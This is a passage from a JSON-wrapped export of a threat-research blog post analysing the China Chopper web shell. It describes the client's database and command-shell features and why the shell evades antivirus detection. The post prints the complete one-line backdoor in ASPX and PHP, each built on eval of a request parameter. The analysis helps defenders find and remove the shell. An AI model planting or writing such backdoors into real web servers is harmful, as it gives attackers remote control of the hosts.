alt=\u0022image011\u0022 class=\u0022alignnone size-full wp-image-2633 landscape-lg\u0022 width=\u0022856\u0022 height=\u0022322\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 11: Database Management requires simple configuration parameters to connect\u003C\/p\u003E\n\u003Cp\u003EAfter connecting, China Chopper also provides helpful SQL commands that you may want to run.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image012.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image012.png\u0022 alt=\u0022image012\u0022 class=\u0022alignnone size-full wp-image-2634 landscape-lg\u0022 width=\u0022855\u0022 height=\u0022322\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 12: Database Management provides the ability to interact with a database and even provides helpful prepopulated commands\u003C\/p\u003E\n\u003Ch3\u003ECommand Shell Access\u003C\/h3\u003E\n\u003Cp\u003EFinally, command shell access is provided for that OS level interaction you crave. What a versatile little Web shell!\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image013.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image013.png\u0022 alt=\u0022image013\u0022 class=\u0022alignnone size-full wp-image-2635 landscape-lg\u0022 width=\u0022855\u0022 height=\u0022349\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 13: Virtual Terminal provides a command shell for OS interaction\u003C\/p\u003E\n\u003Ch2\u003EPayload Attributes\u003C\/h2\u003E\n\u003Cp\u003EWe stated above that this backdoor is stealthy due to a number of factors including the following:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ESize\u003C\/li\u003E\n\u003Cli\u003EServer-side content\u003C\/li\u003E\n\u003Cli\u003EClient-side content\u003C\/li\u003E\n\u003Cli\u003EAV detection rate\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch3\u003ESize\u003C\/h3\u003E\n\u003Cp\u003ELegitimate and illegitimate software usually suffer from the same principle: more features equals more code, which equals larger size. Considering how many features this Web shell contains, it is incredibly small \u2014\u0026nbsp;just 73 bytes for the aspx version, or 4 kilobytes on disk (see Figure 14). Compare that to other Web shells such as Laudanum (619 bytes) or RedTeam Pentesting (8,527 bytes). China Chopper is so small and simple that you could conceivably type the contents of the shell by hand.\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003E\u003Ci\u003E\u003Ci\u003E\u003Ci\u003E\u0026nbsp;\u003C\/i\u003E\u003C\/i\u003E\u003C\/i\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image014.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image014.png\u0022 alt=\u0022image014\u0022 class=\u0022alignnone size-full wp-image-2636 portrait-sm\u0022 width=\u0022364\u0022 height=\u0022496\u0022\u003E\u003C\/a\u003E\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 14: China Chopper file properties\u003C\/p\u003E\n\u003Ch3\u003EServer-Side Content\u003C\/h3\u003E\n\u003Cp\u003EThe server side content could easily be overlooked among the other files associated with a vanilla install of a complex application. The code does not look too evil in nature, but is curious.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image015.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image015.png\u0022 alt=\u0022image015\u0022 class=\u0022alignnone size-full wp-image-2637 landscape-med\u0022 width=\u0022613\u0022 height=\u0022103\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 15: The content of the file seems relatively benign, especially if you add a warm and fuzzy word like Security as the shell password\u003C\/p\u003E\n\u003Cp\u003EBelow are the contents of the Web shell for two of its varieties.\u003C\/p\u003E\n\u003Cp\u003E\u003Cb\u003EASPX:\u003C\/b\u003E\u003C\/p\u003E\n\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022798\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cpre\u003E\n\u003Cb\u003E\u0026nbsp;\u003C\/b\u003E\u0026lt;%@ Page Language=\u0026quot;Jscript\u0026quot;%\u0026gt;\u0026lt;%eval(Request.Item[\u0026quot;password\u0026quot;],\u0026quot;unsafe\u0026quot;);%\u0026gt;\u003Cb\u003E\n\u003C\/b\u003E\n\n\n\n\n\n\u003C\/pre\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003C\/div\u003E\n\u003Cp\u003E\u003Cb\u003EPHP:\u003C\/b\u003E\u003C\/p\u003E\n\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022798\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cpre\u003E\n\u003Cb\u003E\u0026nbsp;\u003C\/b\u003E\u0026lt;?php @eval($_POST[\u0026#39;password\u0026#39;]);?\u0026gt;\u003Cb\u003E\n\u003C\/b\u003E\n\n\n\n\n\n\u003C\/pre\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003C\/div\u003E\n\u003Ch3\u003EClient-Side Content\u003C\/h3\u003E\n\u003Cp\u003EBecause all of the code is server-side language that does not generate any client-side code, browsing to the Web shell and viewing the source as a client reveals nothing.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image016.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image016.png\u0022 alt=\u0022image016\u0022 class=\u0022alignnone size-full wp-image-2638 landscape-lg\u0022 width=\u0022957\u0022 height=\u0022400\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 16: Viewing the source of the web shell reveals nothing to the client\u003C\/p\u003E\n\u003Ch3\u003EAnti-virus Detection Rate\u003C\/h3\u003E\n\u003Cp\u003ERunning the Web shell through the virus-scanning website No Virus Thanks shows a detection rate of 0 out of 14, indicating that most, if not all, anti-virus tools would miss the Web shell on an infected system.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image017.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image017.png\u0022 alt=\u0022image017\u0022 class=\u0022alignnone size-full wp-image-2639 portrait-sm\u0022 width=\u0022498\u0022 height=\u0022683\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 17: Results of multiple anti-virus engine inspections showing China Chopper coming up clean\u003C\/p\u003E\n\u003Cp\u003EThe same holds true for VirusTotal. None of its 47 anti-virus engines flags China Chopper as malicious.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image018.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image018.png\u0022 alt=\u0022image018\u0022 class=\u0022alignnone size-full wp-image-2640 landscape-lg\u0022 width=\u0022984\u0022 height=\u0022795\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 18: Results of multiple AV engine inspections showing the Web shell comes up clean\u003C\/p\u003E\n\u003Ch2\u003EConclusion\u003C\/h2\u003E\n\u003Cp\u003EWe hope that this post has advanced the understanding of this compact, flexible, and stealthy Web shell. If you are reading this, you may be facing China Chopper right now \u2014\u0026nbsp;if so, we wish you success in eradicating this pest. \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2013\/08\/breaking-down-the-china-chopper-web-shell-part-ii.html\u0022\u003EIn Part II\u003C\/a\u003E, we examine the platform China Chopper runs on and describe its\u0026nbsp;delivery mechanisms, traffic analysis and detection.\u003C\/p\u003E\n",
        "jcr:lastModified": "Fri Jan 26 2018 17:29:10 GMT-0500",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
      "jcr:lastModified": "Fri Jan 26 2018 17:27:33 GMT-0500",
      "imageRotate": "0"
    }
  }
}
